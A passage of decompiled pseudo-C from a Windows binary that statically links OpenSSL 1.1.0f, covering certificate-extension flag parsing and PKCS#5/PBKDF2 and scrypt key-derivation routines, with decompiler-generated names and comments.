        *(_DWORD *)(a1 + 184) = -1;
      }
      sub_1400ACDA0(v4);
      *(_DWORD *)(a1 + 192) |= 1u;
    }
    v6 = (int **)sub_1400AC9A0(a1, 663, 0i64, 0i64);
    if ( v6 )
    {
      if ( (*(_BYTE *)(a1 + 192) & 0x10) != 0
        || (int)sub_1400AC960(a1, 0x55u, -1) >= 0
        || (int)sub_1400AC960(a1, 0x56u, -1) >= 0 )
      {
        *(_DWORD *)(a1 + 192) |= 0x80u;
      }
      if ( *v6 )
        *(_DWORD *)(a1 + 188) = sub_14007D9A0(*v6);
      else
        *(_DWORD *)(a1 + 188) = -1;
      sub_1400ACB50((unsigned int *)v6);
      *(_DWORD *)(a1 + 192) |= 0x400u;
    }
    v7 = sub_1400AC9A0(a1, 83, 0i64, 0i64);
    if ( v7 )
    {
      if ( *(int *)v7 <= 0 )
      {
        *(_DWORD *)(a1 + 196) = 0;
      }
      else
      {
        v8 = **(unsigned __int8 **)(v7 + 8);
        *(_DWORD *)(a1 + 196) = v8;
        if ( *(int *)v7 > 1 )
          *(_DWORD *)(a1 + 196) = v8 | (*(unsigned __int8 *)(*(_QWORD *)(v7 + 8) + 1i64) << 8);
      }
      *(_DWORD *)(a1 + 192) |= 2u;
      sub_14004FD70(v7);
    }
    *(_DWORD *)(a1 + 200) = 0;
    v9 = (unsigned int *)sub_1400AC9A0(a1, 126, 0i64, 0i64);
    v10 = v9;
    if ( v9 )
    {
      *(_DWORD *)(a1 + 192) |= 4u;
      v29 = 0;
      v11 = sub_1400296E0(v9);
      v12 = v29;
      if ( v29 < v11 )
      {
        do
        {
          v13 = sub_140029880((__int64)v10, v12);
          v14 = sub_14002C260(v13);
          if ( v14 > 180 )
          {
            if ( v14 == 297 )
            {
              *(_DWORD *)(a1 + 200) |= 0x80u;
            }
            else if ( v14 == 910 )
            {
              *(_DWORD *)(a1 + 200) |= 0x100u;
            }
          }
          else if ( v14 == 180 )
          {
            *(_DWORD *)(a1 + 200) |= 0x20u;
          }
          else
          {
            switch ( v14 )
            {
              case 129:
                *(_DWORD *)(a1 + 200) |= 1u;
                break;
              case 130:
                *(_DWORD *)(a1 + 200) |= 2u;
                break;
              case 131:
                *(_DWORD *)(a1 + 200) |= 8u;
                break;
              case 132:
                *(_DWORD *)(a1 + 200) |= 4u;
                break;
              case 133:
                *(_DWORD *)(a1 + 200) |= 0x40u;
                break;
              case 137:
              case 139:
                *(_DWORD *)(a1 + 200) |= 0x10u;
                break;
              default:
                break;
            }
          }
          ++v29;
          v15 = sub_1400296E0(v10);
          v12 = v29;
        }
        while ( v29 < v15 );
      }
      sub_140029720(v10, (void (*)(void))sub_14003F4D0);
    }
    v16 = sub_1400AC9A0(a1, 71, 0i64, 0i64);
    if ( v16 )
    {
      if ( *(int *)v16 <= 0 )
        *(_DWORD *)(a1 + 204) = 0;
      else
        *(_DWORD *)(a1 + 204) = **(unsigned __int8 **)(v16 + 8);
      *(_DWORD *)(a1 + 192) |= 8u;
      sub_14004FD70(v16);
    }
    *(_QWORD *)(a1 + 208) = sub_1400AC9A0(a1, 82, 0i64, 0i64);
    *(_QWORD *)(a1 + 216) = sub_1400AC9A0(a1, 90, 0i64, 0i64);
    v17 = __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a1);
    v18 = sub_14005F000(a1);
    if ( !sub_14005EF30(v18, v17) )
    {
      v19 = *(_QWORD *)(a1 + 216);
      *(_DWORD *)(a1 + 192) |= 0x20u;
      if ( !(unsigned int)sub_140060AB0((_LocaleUpdate *)a1, v19) )
      {
        v20 = *(_DWORD *)(a1 + 192);
        if ( (v20 & 2) == 0 || (*(_BYTE *)(a1 + 196) & 4) != 0 )
          *(_DWORD *)(a1 + 192) = v20 | 0x2000;
      }
    }
    *(_QWORD *)(a1 + 240) = sub_1400AC9A0(a1, 85, 0i64, 0i64);
    v21 = sub_1400AC9A0(a1, 666, &v29, 0i64);
    *(_QWORD *)(a1 + 248) = v21;
    if ( !v21 && v29 != -1 )
      *(_DWORD *)(a1 + 192) |= 0x80u;
    sub_140060DC0(a1);
    *(_QWORD *)(a1 + 256) = sub_1400AC9A0(a1, 290, 0i64, 0i64);
    *(_QWORD *)(a1 + 264) = sub_1400AC9A0(a1, 291, 0i64, 0i64);
    v29 = 0;
    v22 = sub_1400AC980(a1);
    v23 = v29;
    if ( v29 < v22 )
    {
      while ( 1 )
      {
        v24 = sub_1400AC940(a1, v23);
        v25 = sub_1400252A0(v24);
        if ( (unsigned int)sub_14002C260(v25) == 857 )
          *(_DWORD *)(a1 + 192) |= 0x1000u;
        LOBYTE(v26) = sub_1400AC9C0(v24);
        if ( v26 )
        {
          v27 = sub_1400252A0(v24);
          v30 = sub_14002C260(v27);
          if ( !v30
            || !sub_14002BCB0(
                  (__int64)&v30,
                  (__int64)"G",
                  14,
                  4,
                  (__int64 (__fastcall *)(__int64, __int64))sub_140024C80) )
          {
            break;
          }
        }
        ++v29;
        v28 = sub_1400AC980(a1);
        v23 = v29;
        if ( v29 >= v28 )
          goto LABEL_69;
      }
      *(_DWORD *)(a1 + 192) |= 0x200u;
    }
LABEL_69:
    *(_DWORD *)(a1 + 192) |= 0x100u;
  }
}
// 14006135B: variable 'v26' is possibly undefined
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (0000000140061410) ----------------------------------------------------
__int64 sub_140061410()
{
  if ( !sub_140023E40(dword_140135900) )
  {
    sub_140024410(0, &dword_140135900);
    sub_140024410(0, dword_1401359C0);
  }
  return 1i64;
}
// 140135900: using guessed type int dword_140135900;
// 1401359C0: using guessed type _DWORD dword_1401359C0[2];

//----- (0000000140061460) ----------------------------------------------------
__int64 sub_140061460()
{
  if ( !sub_140023E40(dword_140135A00) )
  {
    sub_140024410(0, &dword_140135A00);
    sub_140024410(0, dword_140135C90);
  }
  return 1i64;
}
// 140135A00: using guessed type int dword_140135A00;
// 140135C90: using guessed type _DWORD dword_140135C90[2];

//----- (00000001400614B0) ----------------------------------------------------
__int64 sub_1400614B0()
{
  if ( !sub_140023E40(dword_140135EE0) )
  {
    sub_140024410(0, &dword_140135EE0);
    sub_140024410(0, dword_1401361B0);
  }
  return 1i64;
}
// 140135EE0: using guessed type int dword_140135EE0;
// 1401361B0: using guessed type _DWORD dword_1401361B0[2];

//----- (0000000140061500) ----------------------------------------------------
__int64 sub_140061500()
{
  if ( !sub_140023E40(dword_1401369F0) )
  {
    sub_140024410(0, &dword_1401369F0);
    sub_140024410(0, dword_140136300);
  }
  return 1i64;
}
// 140136300: using guessed type _DWORD dword_140136300[2];
// 1401369F0: using guessed type int dword_1401369F0;

//----- (0000000140061550) ----------------------------------------------------
__int64 sub_140061550()
{
  if ( !sub_140023E40(dword_1401373F0) )
  {
    sub_140024410(0, &dword_1401373F0);
    sub_140024410(0, dword_140137030);
  }
  return 1i64;
}
// 140137030: using guessed type _DWORD dword_140137030[2];
// 1401373F0: using guessed type int dword_1401373F0;

//----- (00000001400615A0) ----------------------------------------------------
__int64 sub_1400615A0()
{
  if ( !sub_140023E40(dword_140137D10) )
  {
    sub_140024410(0, &dword_140137D10);
    sub_140024410(0, dword_1401433A0);
  }
  return 1i64;
}
// 140137D10: using guessed type int dword_140137D10;
// 1401433A0: using guessed type _DWORD dword_1401433A0[4];

//----- (00000001400615F0) ----------------------------------------------------
__int64 sub_1400615F0()
{
  if ( !sub_140023E40(dword_140137D50) )
  {
    sub_140024410(0, &dword_140137D50);
    sub_140024410(0, dword_140137DA0);
  }
  return 1i64;
}
// 140137D50: using guessed type int dword_140137D50;
// 140137DA0: using guessed type _DWORD dword_140137DA0[2];

//----- (0000000140061640) ----------------------------------------------------
__int64 sub_140061640()
{
  if ( !sub_140023E40(dword_140137DE0) )
  {
    sub_140024410(0, &dword_140137DE0);
    sub_140024410(0, dword_140138170);
  }
  return 1i64;
}
// 140137DE0: using guessed type int dword_140137DE0;
// 140138170: using guessed type _DWORD dword_140138170[2];

//----- (0000000140061690) ----------------------------------------------------
__int64 sub_140061690()
{
  if ( !sub_140023E40(dword_140138570) )
  {
    sub_140024410(0, &dword_140138570);
    sub_140024410(0, dword_1401386B0);
  }
  return 1i64;
}
// 140138570: using guessed type int dword_140138570;
// 1401386B0: using guessed type _DWORD dword_1401386B0[2];

//----- (00000001400616E0) ----------------------------------------------------
__int64 sub_1400616E0()
{
  if ( !sub_140023E40(dword_140138790) )
  {
    sub_140024410(0, &dword_140138790);
    sub_140024410(0, dword_140138900);
  }
  return 1i64;
}
// 140138790: using guessed type int dword_140138790;
// 140138900: using guessed type _DWORD dword_140138900[2];

//----- (0000000140061730) ----------------------------------------------------
__int64 sub_140061730()
{
  if ( !sub_140023E40(dword_1401389D0) )
  {
    sub_140024410(0, &dword_1401389D0);
    sub_140024410(0, dword_140138A50);
  }
  return 1i64;
}
// 1401389D0: using guessed type int dword_1401389D0;
// 140138A50: using guessed type _DWORD dword_140138A50[2];

//----- (0000000140061780) ----------------------------------------------------
__int64 sub_140061780()
{
  if ( !sub_140023E40(dword_140138A80) )
  {
    sub_140024410(0, &dword_140138A80);
    sub_140024410(0, dword_140138ED0);
  }
  return 1i64;
}
// 140138A80: using guessed type int dword_140138A80;
// 140138ED0: using guessed type _DWORD dword_140138ED0[2];

//----- (00000001400617D0) ----------------------------------------------------
__int64 sub_1400617D0()
{
  if ( !sub_140023E40(dword_1401392A0) )
  {
    sub_140024410(0, &dword_1401392A0);
    sub_140024410(0, dword_140139510);
  }
  return 1i64;
}
// 1401392A0: using guessed type int dword_1401392A0;
// 140139510: using guessed type _DWORD dword_140139510[2];

//----- (0000000140061820) ----------------------------------------------------
__int64 sub_140061820()
{
  if ( !sub_140023E40(dword_140139970) )
  {
    sub_140024410(0, &dword_140139970);
    sub_140024410(0, dword_140139700);
  }
  return 1i64;
}
// 140139700: using guessed type _DWORD dword_140139700[2];
// 140139970: using guessed type int dword_140139970;

//----- (0000000140061870) ----------------------------------------------------
__int64 sub_140061870()
{
  if ( !sub_140023E40(dword_140139BA0) )
  {
    sub_140024410(0, &dword_140139BA0);
    sub_140024410(0, dword_140139EE0);
  }
  return 1i64;
}
// 140139BA0: using guessed type int dword_140139BA0;
// 140139EE0: using guessed type _DWORD dword_140139EE0[2];

//----- (00000001400618C0) ----------------------------------------------------
__int64 sub_1400618C0()
{
  if ( !sub_140023E40(dword_14013A220) )
  {
    sub_140024410(0, &dword_14013A220);
    sub_140024410(0, dword_14013A110);
  }
  return 1i64;
}
// 14013A110: using guessed type _DWORD dword_14013A110[2];
// 14013A220: using guessed type int dword_14013A220;

//----- (0000000140061910) ----------------------------------------------------
__int64 sub_140061910()
{
  if ( !sub_140023E40(dword_14013A360) )
  {
    sub_140024410(0, &dword_14013A360);
    sub_140024410(0, dword_14013A730);
  }
  return 1i64;
}
// 14013A360: using guessed type int dword_14013A360;
// 14013A730: using guessed type _DWORD dword_14013A730[2];

//----- (0000000140061960) ----------------------------------------------------
__int64 sub_140061960()
{
  if ( !sub_140023E40(dword_14013ACB0) )
  {
    sub_140024410(0, &dword_14013ACB0);
    sub_140024410(0, dword_14013AB50);
  }
  return 1i64;
}
// 14013AB50: using guessed type _DWORD dword_14013AB50[2];
// 14013ACB0: using guessed type int dword_14013ACB0;

//----- (00000001400619B0) ----------------------------------------------------
__int64 sub_1400619B0()
{
  if ( !sub_140023E40(dword_14013AE50) )
  {
    sub_140024410(0, &dword_14013AE50);
    sub_140024410(0, dword_14013AE70);
  }
  return 1i64;
}
// 14013AE50: using guessed type int dword_14013AE50;
// 14013AE70: using guessed type _DWORD dword_14013AE70[2];

//----- (0000000140061A00) ----------------------------------------------------
__int64 sub_140061A00()
{
  if ( !sub_140023E40(dword_14013AE90) )
  {
    sub_140024410(0, &dword_14013AE90);
    sub_140024410(0, dword_14013B0D0);
  }
  return 1i64;
}
// 14013AE90: using guessed type int dword_14013AE90;
// 14013B0D0: using guessed type _DWORD dword_14013B0D0[2];

//----- (0000000140061A50) ----------------------------------------------------
__int64 sub_140061A50()
{
  if ( !sub_140023E40(dword_14013B1E0) )
  {
    sub_140024410(0, &dword_14013B1E0);
    sub_140024410(0, dword_14013B300);
  }
  return 1i64;
}
// 14013B1E0: using guessed type int dword_14013B1E0;
// 14013B300: using guessed type _DWORD dword_14013B300[2];

//----- (0000000140061AA0) ----------------------------------------------------
__int64 sub_140061AA0()
{
  if ( !sub_140023E40(dword_14013B3D0) )
  {
    sub_140024410(0, &dword_14013B3D0);
    sub_140024410(0, dword_14013B630);
  }
  return 1i64;
}
// 14013B3D0: using guessed type int dword_14013B3D0;
// 14013B630: using guessed type _DWORD dword_14013B630[2];

//----- (0000000140061AF0) ----------------------------------------------------
__int64 sub_140061AF0()
{
  if ( !sub_140023E40(dword_14013B870) )
  {
    sub_140024410(0, &dword_14013B870);
    sub_140024410(0, dword_14013B970);
  }
  return 1i64;
}
// 14013B870: using guessed type int dword_14013B870;
// 14013B970: using guessed type _DWORD dword_14013B970[2];

//----- (0000000140061B40) ----------------------------------------------------
__int64 sub_140061B40()
{
  if ( !sub_140023E40(dword_14013BB20) )
  {
    sub_140024410(0, &dword_14013BB20);
    sub_140024410(0, dword_14013BE90);
  }
  return 1i64;
}
// 14013BB20: using guessed type int dword_14013BB20;
// 14013BE90: using guessed type _DWORD dword_14013BE90[2];

//----- (0000000140061B90) ----------------------------------------------------
__int64 sub_140061B90()
{
  if ( !sub_140023E40(dword_14013C630) )
  {
    sub_140024410(0, &dword_14013C630);
    sub_140024410(0, dword_14013C100);
  }
  return 1i64;
}
// 14013C100: using guessed type _DWORD dword_14013C100[2];
// 14013C630: using guessed type int dword_14013C630;

//----- (0000000140061BE0) ----------------------------------------------------
__int64 sub_140061BE0()
{
  if ( !sub_140023E40(dword_14013CB40) )
  {
    sub_140024410(0, &dword_14013CB40);
    sub_140024410(0, dword_14013CD00);
  }
  return 1i64;
}
// 14013CB40: using guessed type int dword_14013CB40;
// 14013CD00: using guessed type _DWORD dword_14013CD00[2];

//----- (0000000140061C30) ----------------------------------------------------
__int64 sub_140061C30()
{
  if ( !sub_140023E40(dword_14013CE20) )
  {
    sub_140024410(0, &dword_14013CE20);
    sub_140024410(0, dword_14013CE90);
  }
  return 1i64;
}
// 14013CE20: using guessed type int dword_14013CE20;
// 14013CE90: using guessed type _DWORD dword_14013CE90[2];

//----- (0000000140061C80) ----------------------------------------------------
__int64 sub_140061C80()
{
  if ( !sub_140023E40(dword_14013CEE0) )
  {
    sub_140024410(0, &dword_14013CEE0);
    sub_140024410(0, dword_14013CF10);
  }
  return 1i64;
}
// 14013CEE0: using guessed type int dword_14013CEE0;
// 14013CF10: using guessed type _DWORD dword_14013CF10[2];

//----- (0000000140061CD0) ----------------------------------------------------
char **sub_140061CD0()
{
  return &off_14013CF50;
}
// 14013CF50: using guessed type char *off_14013CF50;

//----- (0000000140061CE0) ----------------------------------------------------
__int64 __fastcall sub_140061CE0(char *a1, int a2, __int64 a3, __int64 a4, int a5, int *a6, int a7, char *a8)
{
  int v11; // r13d
  _QWORD *v13; // r15
  unsigned int v14; // ebx
  char *i; // rax
  _QWORD *v16; // rdi
  int v17; // eax
  int v18; // ebx
  int v19; // eax
  _QWORD *v20; // rcx
  int v21; // ebp
  int v22; // eax
  __int64 v23; // r9
  __int64 v24; // rcx
  const __m128i *v25; // rcx
  __m128i v26; // xmm0
  __m128i v27; // xmm1
  char *v28; // rax
  __int64 v29; // rdx
  int v30; // [rsp+34h] [rbp-B4h]
  char Src[16]; // [rsp+50h] [rbp-98h] BYREF
  char v32; // [rsp+60h] [rbp-88h] BYREF

  v30 = 1;
  v11 = sub_1400253D0((__int64)a6);
  if ( v11 < 0 )
    return 0i64;
  v13 = sub_14006B370();
  if ( !v13 )
    return 0i64;
  if ( a1 )
  {
    if ( a2 == -1 )
    {
      v14 = 0;
      for ( i = a1; *i; ++v14 )
      {
        if ( v14 >= 0x80000000 )
          break;
        ++i;
      }
      a2 = v14 & 0x7FFFFFFF;
    }
  }
  else
  {
    a1 = byte_1400D7DAE;
    a2 = 0;
  }
  if ( !sub_14006B5B0((__int64)v13, a1, a2, a6, 0i64) || (v16 = sub_14006B370()) == 0i64 )
  {
    sub_14006B2F0(v13);
    return 0i64;
  }
  v17 = a7;
  if ( a7 )
  {
    while ( 1 )
    {
      v18 = v17;
      if ( v17 > v11 )
        v18 = v11;
      v19 = sub_14006B1E0((__int64)v16, (__int64)v13);
      v20 = v16;
      if ( !v19 )
        break;
      if ( !(unsigned int)sub_14006B820(v16)
        || !(unsigned int)sub_14006B820(v16)
        || !sub_14006B500((__int64)v16, (__int64)Src, 0i64) )
      {
LABEL_37:
        v20 = v16;
        break;
      }
      sub_14006B3C0((__int64)v16);
      memmove(a8, Src, v18);
      v21 = 1;
      if ( a5 > 1 )
      {
        do
        {
          v22 = sub_14006B1E0((__int64)v16, (__int64)v13);
          v20 = v16;
          if ( !v22 )
            goto LABEL_38;
          if ( !(unsigned int)sub_14006B820(v16) || !sub_14006B500((__int64)v16, (__int64)Src, 0i64) )
            goto LABEL_37;
          sub_14006B3C0((__int64)v16);
          v23 = 0i64;
          if ( v18 >= 32 )
          {
            v24 = v18 - 1;
            if ( a8 > &Src[v24] || &a8[v24] < Src )
            {
              v25 = (const __m128i *)a8;
              do
              {
                v26 = _mm_loadu_si128(v25);
                v23 += 32i64;
                v27 = _mm_loadu_si128((const __m128i *)((char *)v25 + Src - a8));
                v25 += 2;
                v25[-2] = _mm_xor_si128(v27, v26);
                v25[-1] = _mm_xor_si128(
                            _mm_loadu_si128((const __m128i *)((char *)v25 + &v32 - a8 - 32)),
                            _mm_loadu_si128(v25 - 1));
              }
              while ( v23 < v18 - (v18 & 0x1F) );
            }
          }
          if ( v23 < v18 )
          {
            v28 = &a8[v23];
            v29 = v18 - v23;
            do
            {
              *v28 ^= v28[Src - a8];
              ++v28;
              --v29;
            }
            while ( v29 );
          }
        }
        while ( ++v21 < a5 );
      }
      a8 += v18;
      ++v30;
      v17 = a7 - v18;
      a7 = v17;
      if ( !v17 )
        goto LABEL_39;
    }
LABEL_38:
    sub_14006B2F0(v20);
    sub_14006B2F0(v13);
    return 0i64;
  }
  else
  {
LABEL_39:
    sub_14006B2F0(v16);
    sub_14006B2F0(v13);
    return 1i64;
  }
}
// 140061F2D: conditional instruction was optimized away because ebx.4>=20
// 140061F27: mask 0x8000001F is shortened because ebx.4 <= 0x7FFFFFFF

//----- (0000000140062050) ----------------------------------------------------
__int64 __fastcall sub_140062050(_DWORD *a1, __int64 a2, unsigned int a3, __int64 a4, int a5, int a6, int a7)
{
  unsigned int v11; // edi
  void *v12; // rax
  __int64 **v13; // rax
  __int64 **v14; // rbx
  int v15; // eax
  unsigned int v16; // eax
  char *v17; // rax
  int *v18; // rax
  __int64 v20[5]; // [rsp+40h] [rbp-28h] BYREF

  v11 = 0;
  v12 = sub_1400ACDE0();
  v13 = (__int64 **)sub_14003F490((__int64)v12, a4);
  v14 = v13;
  if ( v13 )
  {
    v15 = sub_14002C260(**v13);
    if ( (unsigned int)sub_140036270(2, v15, 0i64, 0i64, v20) )
    {
      v16 = sub_14002C260(*v14[1]);
      v17 = sub_14002C1A0(v16);
      v18 = (int *)sub_14001E950((__int64)v17);
      if ( v18 )
      {
        if ( (unsigned int)sub_14001B7A0(a1, v18, 0i64, 0i64, 0i64, a7) )
        {
          if ( (int)sub_140024D90((__int64)a1, v14[1][1]) >= 0 )
            v11 = ((__int64 (__fastcall *)(_DWORD *, __int64, _QWORD, __int64, _QWORD, _QWORD, int))v20[0])(
                    a1,
                    a2,
                    a3,
                    (*v14)[1],
                    0i64,
                    0i64,
                    a7);
          else
            sub_140024610(6, 118, 122, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\p5_crpt2.c", 192);
        }
      }
      else
      {
        sub_140024610(6, 118, 107, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\p5_crpt2.c", 184);
      }
    }
    else
    {
      sub_140024610(6, 118, 124, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\p5_crpt2.c", 173);
    }
  }
  else
  {
    sub_140024610(6, 118, 114, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\p5_crpt2.c", 165);
  }
  sub_1400ACDC0((unsigned int *)v14);
  return v11;
}
// 140062050: using guessed type __int64 var_28[5];

//----- (00000001400621F0) ----------------------------------------------------
__int64 __fastcall sub_1400621F0(_DWORD *a1, char *a2, int a3, __int64 a4, int a5, int a6, int a7)
{
  unsigned int v7; // r14d
  unsigned int v8; // ebp
  unsigned int *v9; // rsi
  void *v13; // rax
  unsigned int v14; // eax
  int *v15; // rcx
  __int64 *v16; // rcx
  int v17; // eax
  char *v18; // rax
  int *v19; // r12
  int *v20; // rax
  __int64 v21; // rdi
  unsigned int v22; // ebx
  int v23; // eax
  unsigned int v25; // [rsp+40h] [rbp-A8h] BYREF
  int v26; // [rsp+44h] [rbp-A4h]
  char v27[64]; // [rsp+50h] [rbp-98h] BYREF

  v7 = 0;
  v26 = a3;
  v8 = 0;
  v9 = 0i64;
  if ( sub_140021BD0((__int64)a1) )
  {
    v8 = sub_140024D30((__int64)a1);
    if ( v8 > 0x40 )
      sub_1400234A0("assertion failed: keylen <= sizeof key", "..\\..\\openssl-1.1.0f\\crypto\\evp\\p5_crpt2.c", 218i64);
    v13 = sub_1400ACE10();
    v9 = (unsigned int *)sub_14003F490((__int64)v13, a4);
    if ( v9 )
    {
      v14 = sub_140024D30((__int64)a1);
      v15 = (int *)*((_QWORD *)v9 + 2);
      v8 = v14;
      if ( !v15 || (unsigned int)sub_14007D9A0(v15) == v14 )
      {
        v16 = (__int64 *)*((_QWORD *)v9 + 3);
        if ( v16 )
          v17 = sub_14002C260(*v16);
        else
          v17 = 163;
        if ( (unsigned int)sub_140036270(1, v17, 0i64, &v25, 0i64) )
        {
          v18 = sub_14002C1A0(v25);
          v19 = (int *)sub_14001E990((__int64)v18);
          if ( v19 )
          {
            if ( **(_DWORD **)v9 == 4 )
            {
              v20 = *(int **)(*(_QWORD *)v9 + 8i64);
              v21 = *((_QWORD *)v20 + 1);
              v22 = *v20;
              v23 = sub_14007D9A0(*((int **)v9 + 1));
              if ( (unsigned int)sub_140061CE0(a2, v26, v21, v22, v23, v19, v8, v27) )
                v7 = sub_14001B7A0(a1, 0i64, 0i64, (__int64)v27, 0i64, a7);
            }
            else
            {
              sub_140024610(6, 164, 126, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\p5_crpt2.c", 255);
            }
          }
          else
          {
            sub_140024610(6, 164, 125, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\p5_crpt2.c", 250);
          }
        }
        else
        {
          sub_140024610(6, 164, 125, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\p5_crpt2.c", 244);
        }
      }
      else
      {
        sub_140024610(6, 164, 123, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\p5_crpt2.c", 234);
      }
    }
    else
    {
      sub_140024610(6, 164, 114, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\p5_crpt2.c", 225);
    }
  }
  else
  {
    sub_140024610(6, 164, 131, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\p5_crpt2.c", 214);
  }
  sub_140023440((__int64)v27, v8);
  sub_1400ACDF0(v9);
  return v7;
}
// 1400621F0: using guessed type char var_98[64];

//----- (0000000140062490) ----------------------------------------------------
__int64 __fastcall sub_140062490(_DWORD *a1, _BYTE *a2, int a3, __int64 a4, int *a5, int *a6, int a7)
{
  unsigned int v7; // r12d
  void *v11; // rax
  __int64 v12; // rax
  unsigned int *v13; // r14
  int *v15; // rcx
  int v16; // esi
  unsigned int v17; // ebx
  _BYTE *i; // rax
  __int64 *v19; // rax
  __int64 *v20; // rdi
  int v21; // ebx
  int v22; // eax
  size_t v23; // rbx
  int v24; // eax
  char v26[24]; // [rsp+48h] [rbp-F0h] BYREF
  char Src[64]; // [rsp+60h] [rbp-D8h] BYREF
  int v28[16]; // [rsp+A0h] [rbp-98h] BYREF

  v7 = 0;
  if ( a4 && *(_DWORD *)a4 == 16 && *(_QWORD *)(a4 + 8) )
  {
    v11 = sub_1400ACE40();
    v12 = sub_14003F490((__int64)v11, a4);
    v13 = (unsigned int *)v12;
    if ( !v12 )
    {
      sub_140024610(6, 117, 114, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\p5_crpt.c", 47);
      return 0i64;
    }
    v15 = *(int **)(v12 + 8);
    if ( v15 )
      v16 = sub_14007D9A0(v15);
    else
      v16 = 1;
    if ( a2 )
    {
      if ( a3 == -1 )
      {
        v17 = 0;
        for ( i = a2; *i; ++v17 )
        {
          if ( v17 >= 0x80000000 )
            break;
          ++i;
        }
      }
    }
    v19 = (__int64 *)sub_14006DFD0();
    v20 = v19;
    if ( !v19 )
    {
      sub_140024610(6, 117, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\p5_crpt.c", 65);
      sub_14006DF90(0i64);
      return 0i64;
    }
    if ( (unsigned int)sub_14006DB20((__int64)v19, a6, 0i64) )
    {
      if ( (unsigned int)sub_14006DD90((__int64)v20) )
      {
        if ( (unsigned int)sub_14006DD90((__int64)v20) )
        {
          sub_1400ACE20(v13);
          if ( (unsigned int)sub_14006DA80(v20, (__int64)Src, 0i64) )
          {
            if ( (int)sub_1400253D0((__int64)a6) < 0 )
              return 0i64;
            v21 = 1;
            if ( v16 <= 1 )
            {
LABEL_27:
              if ( (int)sub_140024EB0((__int64)a5) > 64 )
                sub_1400234A0(
                  "assertion failed: EVP_CIPHER_key_length(cipher) <= (int)sizeof(md_tmp)",
                  "..\\..\\openssl-1.1.0f\\crypto\\evp\\p5_crpt.c",
                  89i64);
              v22 = sub_140024EB0((__int64)a5);
              memmove(v28, Src, v22);
              if ( (int)sub_140024EA0((__int64)a5) > 16 )
                sub_1400234A0(
                  "assertion failed: EVP_CIPHER_iv_length(cipher) <= 16",
                  "..\\..\\openssl-1.1.0f\\crypto\\evp\\p5_crpt.c",
                  91i64);
              v23 = (int)sub_140024EA0((__int64)a5);
              v24 = sub_140024EA0((__int64)a5);
              memmove(v26, &Src[16 - v24], v23);
              if ( (unsigned int)sub_14001B7A0(a1, a5, 0i64, (__int64)v28, v26, a7) )
              {
                sub_140023440((__int64)Src, 64i64);
                sub_140023440((__int64)v28, 64i64);
                sub_140023440((__int64)v26, 16i64);
                v7 = 1;
              }
            }
            else
            {
              while ( (unsigned int)sub_14006DB20((__int64)v20, a6, 0i64)
                   && (unsigned int)sub_14006DD90((__int64)v20)
                   && (unsigned int)sub_14006DA80(v20, (__int64)Src, 0i64) )
              {
                if ( ++v21 >= v16 )
                  goto LABEL_27;
              }
            }
          }
        }
      }
    }
    sub_14006DF90(v20);
    return v7;
  }
  else
  {
    sub_140024610(6, 117, 114, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\p5_crpt.c", 41);
    return 0i64;
  }
}
// 140062490: using guessed type int *arg_20;

//----- (0000000140062820) ----------------------------------------------------
__int64 __fastcall sub_140062820(_DWORD *a1, char *a2, int a3, __int64 a4, int a5, int a6, int a7)
{
  unsigned int v7; // edi
  unsigned int **v9; // rbx
  int v13; // eax
  int *v14; // rdx
  __int64 v15; // rsi
  __int64 v17; // [rsp+50h] [rbp-A8h] BYREF
  __int64 v18; // [rsp+58h] [rbp-A0h] BYREF
  __int64 v19; // [rsp+60h] [rbp-98h] BYREF
  __int64 v20; // [rsp+68h] [rbp-90h] BYREF
  char v21[64]; // [rsp+70h] [rbp-88h] BYREF

  v7 = 0;
  v9 = 0i64;
  if ( sub_140021BD0((__int64)a1) )
  {
    v9 = (unsigned int **)sub_14003F490((__int64)&unk_140105E70, a4);
    if ( v9 )
    {
      v13 = sub_140024D30((__int64)a1);
      v14 = (int *)v9[4];
      v15 = v13;
      if ( !v14 || (unsigned int)sub_14007DA40(&v20, v14) && v20 == v15 )
      {
        if ( (unsigned int)sub_14007DA40(&v19, (int *)v9[1])
          && (unsigned int)sub_14007DA40(&v18, (int *)v9[2])
          && (unsigned int)sub_14007DA40(&v17, (int *)v9[3])
          && (unsigned int)sub_1400ACE50(0i64, 0, 0i64, 0, v19, v18, v17, 0i64, 0i64, 0) )
        {
          if ( (unsigned int)sub_1400ACE50(a2, a3, *((_QWORD *)*v9 + 1), **v9, v19, v18, v17, 0i64, v21, v15) )
            v7 = sub_14001B7A0(a1, 0i64, 0i64, (__int64)v21, 0i64, a7);
        }
        else
        {
          sub_140024610(6, 180, 171, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\p5_scrypt.c", 265);
        }
      }
      else
      {
        sub_140024610(6, 180, 123, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\p5_scrypt.c", 255);
      }
      if ( v15 )
        sub_140023440((__int64)v21, v15);
    }
    else
    {
      sub_140024610(6, 180, 114, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\p5_scrypt.c", 242);
    }
  }
  else
  {
    sub_140024610(6, 180, 131, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\p5_scrypt.c", 233);
  }
  sub_140051250((unsigned int *)v9, (__int64)&unk_140105E70);
  return v7;
}
// 140062820: using guessed type char var_88[64];

//----- (0000000140062A60) ----------------------------------------------------
__int64 __fastcall sub_140062A60(_DWORD *a1, _BYTE *a2, int a3, __int64 a4, int *a5, int *a6, int a7)
{
  void *v10; // rax
  __int64 v11; // rax
  unsigned int *v12; // rbx
  int *v14; // rcx
  int v15; // edi
  __int64 v16; // r12
  int v17; // r13d
  int v18; // eax
  int v19; // eax
